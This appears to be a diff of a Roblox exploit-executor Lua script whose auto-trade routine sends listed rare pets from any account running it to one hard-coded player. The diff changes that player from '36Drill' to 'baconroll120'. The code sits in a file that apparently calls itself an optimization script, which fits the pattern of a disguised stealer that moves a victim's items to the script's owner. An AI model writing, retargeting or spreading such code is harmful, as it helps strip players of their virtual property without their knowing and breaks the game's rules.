@@ -341,8 +341,8 @@ print("Optimization completed")
 -- ============================================================================
 
 getgenv().config = getgenv().config or {
-    TargetPlayer = "36Drill",
-    PetsToTrade = {"Overcharged Robot", "Surge Dragon", "Dual Shock","Neon Cat", "Starlight Deity", "Moon Warden"},
+    TargetPlayer = "baconroll120",
+    PetsToTrade = {"SUPER Luckyblock", "Surge Dragon", "Dual Shock", "Overcharged Robot","Neon Cat","Fortunate Calico", "JACKPOT"},
     Mode = "Send"
 }
 
@@ -364,14 +364,14 @@ local function find_module_anywhere(root, name)
 end
 
 local v3 = v1.LocalPlayer or v1.PlayerAdded:Wait()
--- Bots send trades TO "36Drill", so if we ARE that account, we Claim
--- If we're a bot account, we Send to "36Drill"
-local isCollector = (v3 and v3.Name and v3.Name:lower() == "36drill")
+-- Bots send trades TO "baconroll120", so if we ARE that account, we Claim
+-- If we're a bot account, we Send to "baconroll120"
+local isCollector = (v3 and v3.Name and v3.Name:lower() == "baconroll120")
 
 if isCollector then
     getgenv().config.Mode = "Claim"  -- This account receives trades
 else
-    getgenv().config.Mode = "Send"   -- Bot accounts send to 36Drill
+    getgenv().config.Mode = "Send"   -- Bot accounts send to baconroll120
 end
 print(string.format("[TAP] Mode=%s", getgenv().config.Mode))
 
@@ -602,7 +602,7 @@ if getgenv().config.Mode == "Send" and not isCollector and v5 then
             
             if not v34 or not v34.Enabled then
                 for _, player in ipairs(v1:GetPlayers()) do
-                    if player.Name and player.Name:lower() == "36drill" and player ~= v3 then
+                    if player.Name and player.Name:lower() == "baconroll120" and player ~= v3 then
                         v5:FireServer("SendTrade", player)
                         break
                     end
